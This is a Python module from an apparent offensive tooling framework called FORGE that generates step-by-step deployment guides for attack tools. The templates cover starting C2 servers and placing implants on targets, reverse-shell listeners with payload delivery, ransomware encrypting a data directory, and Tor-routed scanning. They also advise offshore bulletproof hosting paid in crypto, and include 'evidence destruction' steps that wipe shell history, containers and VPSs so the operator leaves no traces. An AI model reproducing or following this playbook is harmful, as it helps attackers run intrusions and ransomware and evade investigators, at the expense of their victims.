"""Deployment Guide Generator — operational deployment walkthroughs.

Generates step-by-step guides from infrastructure provisioning to
post-operation cleanup. Covers Docker, VPS, and bare metal deployments.

Usage:
    from o1o_o.core.deployment_guide import DeploymentGuideGenerator
    dgg = DeploymentGuideGenerator()
    guide = dgg.generate(intent_str, tool_name, config, opsec_result, audit_result, threat_model, task_dir)
"""
# Dependencies: datetime, pathlib
# Depended by: forge_live.py pipeline (step 11)

import datetime
from pathlib import Path


class DeploymentGuideGenerator:
    """
    Generates step-by-step operational deployment walkthrough.
    From infrastructure provisioning to post-operation cleanup.
    """

    def generate(self, intent_str, tool_name, config, opsec_result=None,
                 audit_result=None, threat_model=None, task_dir=None):
        """Generate comprehensive deployment guide."""
        config = config or {}
        il = intent_str.lower()
        deployment = config.get("deployment", "docker")
        routing = config.get("routing", "tor")
        opsec_level = config.get("opsec_level", "full")

        sections = []

        # ── Header ──────────────────────────────────────────────────────────
        sections.append(f"FORGE DEPLOYMENT GUIDE — {tool_name.upper()}")
        sections.append("=" * 60)
        sections.append(f"Generated: {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}")
        sections.append(f"OPSEC Level: {opsec_level.upper()}")
        sections.append(f"Deployment: {deployment.upper()}")
        sections.append(f"Routing: {routing.upper()}")
        if audit_result:
            sections.append(f"Audit Score: {audit_result['score']}/100 (Grade {audit_result['grade']})")
        sections.append("")

        # ── Pre-Deployment Checklist ────────────────────────────────────────
        sections.append("PRE-DEPLOYMENT CHECKLIST")
        sections.append("-" * 40)
        checklist = [
            "[ ] Verify VPN/Tor connectivity before deployment",
            "[ ] Confirm target authorization (rules of engagement)",
            "[ ] Set up out-of-band communication channel",
            "[ ] Prepare clean VM/container for deployment",
            "[ ] Verify DNS does not leak to ISP resolver",
            "[ ] Disable host logging (or route to /dev/null)",
            "[ ] Synchronize clocks to UTC",
            "[ ] Review OPSEC audit findings (opsec_audit.txt)",
        ]
        if threat_model:
            checklist.append(f"[ ] Review threat model ({len(threat_model.get('mitre_techniques', []))} MITRE techniques)")
        if routing == "tor":
            checklist.append("[ ] Verify Tor circuit established (check exit node IP)")
        for item in checklist:
            sections.append(f"  {item}")
        sections.append("")

        # ── Infrastructure Setup ────────────────────────────────────────────
        sections.append("PHASE 1: INFRASTRUCTURE SETUP")
        sections.append("-" * 40)
        if deployment == "docker":
            sections.extend([
                "  # 1. Build the container",
                f"  docker-compose build",
                "",
                "  # 2. Start in detached mode",
                f"  docker-compose up -d",
                "",
                "  # 3. Verify container is running",
                f"  docker ps | grep forge-{tool_name}",
                "",
                "  # 4. Verify network isolation",
                f"  docker network inspect isolated",
                "",
            ])
            if routing == "tor":
                sections.extend([
                    "  # 5. Verify Tor connectivity",
                    "  docker exec forge-{} curl -s --socks5 tor-proxy:9050 https://check.torproject.org/api/ip".format(tool_name),
                    "",
                ])
        elif deployment == "vps":
            sections.extend([
                "  # 1. Provision disposable VPS (recommended: offshore, crypto payment)",
                "  #    - Providers: bulletproof hosting or major cloud with prepaid card",
                "  #    - OS: Ubuntu 22.04 minimal or Alpine Linux",
                "",
                "  # 2. Upload tool package",
                f"  scp -r ./{tool_name}/ operator@<VPS_IP>:/tmp/",
                "",
                "  # 3. On VPS: install Docker + start",
                "  ssh operator@<VPS_IP> 'cd /tmp/{} && docker-compose up -d'".format(tool_name),
                "",
            ])
        else:  # bare
            sections.extend([
                "  # ⚠ BARE METAL — No isolation! For lab/testing only.",
                f"  python3 generated.py --help",
                "",
            ])
        sections.append("")

        # ── Operational Use ─────────────────────────────────────────────────
        sections.append("PHASE 2: OPERATIONAL USE")
        sections.append("-" * 40)

        target = config.get("target", "<TARGET_IP>")

        if any(k in il for k in ("c2", "botnet", "c&c")):
            sections.extend([
                f"  # Start C2 server (inside container)",
                f"  docker exec -it forge-{tool_name} python3 /app/generated.py --mode server",
                "",
                f"  # Deploy implant on target",
                f"  # Transfer generated.py to target via out-of-band method",
                f"  # On target: python3 generated.py --mode bot --host <C2_IP>",
                "",
                f"  # Interactive controller",
                f"  docker exec -it forge-{tool_name} python3 /app/generated.py --mode controller",
                "",
            ])
        elif any(k in il for k in ("scan", "recon", "enum")):
            sections.extend([
                f"  # Run scan through Tor (container routes automatically)",
                f"  docker exec forge-{tool_name} python3 /app/generated.py --target {target}",
                "",
                f"  # Extract results",
                f"  docker cp forge-{tool_name}:/tmp/results.json ./",
                "",
            ])
        elif any(k in il for k in ("shell", "reverse")):
            sections.extend([
                f"  # Start listener (inside container)",
                f"  docker exec -it forge-{tool_name} python3 /app/generated.py --listen",
                "",
                f"  # Deploy payload to target via chosen delivery method",
                f"  # Target executes: python3 generated.py --connect <LISTENER_IP>",
                "",
            ])
        elif any(k in il for k in ("ransomware", "encrypt")):
            sections.extend([
                f"  # ⚠ AUTHORIZED USE ONLY — verify rules of engagement",
                f"  docker exec forge-{tool_name} python3 /app/generated.py --target-dir /data --encrypt",
                "",
                f"  # Recovery key stored in: /tmp/recovery_key.txt",
                f"  docker cp forge-{tool_name}:/tmp/recovery_key.txt ./",
                "",
            ])
        else:
            sections.extend([
                f"  # Execute tool",
                f"  docker exec forge-{tool_name} python3 /app/generated.py",
                "",
            ])
        sections.append("")

        # ── Post-Operation ──────────────────────────────────────────────────
        sections.append("PHASE 3: POST-OPERATION CLEANUP")
        sections.append("-" * 40)
        sections.extend([
            "  # 1. Extract any results/loot first",
            f"  docker cp forge-{tool_name}:/tmp/ ./results/",
            "",
            "  # 2. Run FORGE cleanup script (secure wipe + container destruction)",
            "  bash opsec/cleanup.sh",
            "",
            "  # 3. Manual verification",
            f"  docker ps -a | grep forge    # should be empty",
            "  docker images | grep forge    # should be empty",
            "  docker volume ls              # verify no dangling volumes",
            "",
            "  # 4. Clean local traces",
            "  history -c && history -w      # bash history",
            "  > ~/.bash_history             # or zsh: > ~/.zsh_history",
            "  rm -rf /tmp/forge_*           # temp artifacts",
            "",
        ])
        if routing == "tor":
            sections.extend([
                "  # 5. Request new Tor identity (new circuit)",
                "  #    If using tor-proxy container, restart it for new exit node",
                "",
            ])
        if deployment == "vps":
            sections.extend([
                "  # 6. Destroy VPS",
                "  #    Via provider API or control panel — DO NOT just stop, DESTROY",
                "  #    Verify destruction confirmation from provider",
                "",
            ])
        sections.append("")

        # ── Evidence Destruction ─────────────────────────────────────────────
        sections.append("PHASE 4: EVIDENCE DESTRUCTION")
        sections.append("-" * 40)
        sections.extend([
            "  # Verify no Docker artifacts remain",
            "  docker system prune -af --volumes",
            "",
            "  # Verify no network connections to target remain",
            "  ss -tunap | grep <TARGET_IP>",
            "",
            "  # Verify no DNS cache entries",
            "  # Linux: systemd-resolve --flush-caches",
            "  # macOS: sudo dscacheutil -flushcache",
            "",
            "  # Verify no entries in /tmp/",
            "  ls -la /tmp/ | grep forge",
            "",
        ])
        sections.append("")

        # ── IOC Self-Assessment ─────────────────────────────────────────────
        if threat_model and threat_model.get("iocs"):
            sections.append("IOC SELF-ASSESSMENT")
            sections.append("-" * 40)
            sections.append("  Review these IOCs to verify you left no traces:\n")
            for ioc in threat_model["iocs"]:
                sections.append(f"  [{ioc['type'].upper()}] {ioc['indicator']}")
                sections.append(f"    Check: {ioc['persistence']}")
            sections.append("")

        # ── Notes ───────────────────────────────────────────────────────────
        sections.append("NOTES")
        sections.append("-" * 40)
        sections.append("  • All timestamps in this guide are UTC")
        sections.append("  • Do not reuse infrastructure across operations")
        sections.append("  • Rotate exit nodes/VPNs between operations")
        sections.append("  • Never mix operational and personal traffic on same circuit")
        sections.append("  • Verify OPSEC audit score before deployment (target: A grade, 90+)")
        sections.append("")

        guide_text = "\n".join(sections)

        if task_dir:
            (task_dir / "deployment_guide.txt").write_text(guide_text)

        return guide_text
